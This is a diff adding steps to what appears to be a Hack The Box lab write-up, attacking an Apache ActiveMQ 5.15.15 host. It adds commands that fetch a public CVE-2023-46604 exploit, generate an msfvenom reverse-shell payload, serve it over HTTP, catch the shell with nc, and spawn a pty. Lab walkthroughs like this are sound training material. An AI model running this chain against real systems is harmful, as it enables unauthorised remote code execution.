@@ -1,4 +1,4 @@
-```
+![image](https://github.com/regarmulia/HTB/assets/33616880/a44fdc8c-385a-4943-8840-d3f4730d8e2d)```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.243
 nmap -p- -T5 10.10.11.243
 ```
@@ -25,5 +25,15 @@ activemq broker 5.15.15 exploit
 
 
 ```
-
+git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f elf -o test.elf
+python3 -m http.server 8001
+nc -lvvp 4444
+go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.12:8001/poc-linux.xml
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
+![image](https://github.com/regarmulia/HTB/assets/33616880/169c76d4-7ac4-4fae-acd7-42e63f508289)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/497cfa98-5b46-4748-bb90-3504ed9869d3)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/b1fd204c-a6df-4c0c-af35-e24df116c0c3)
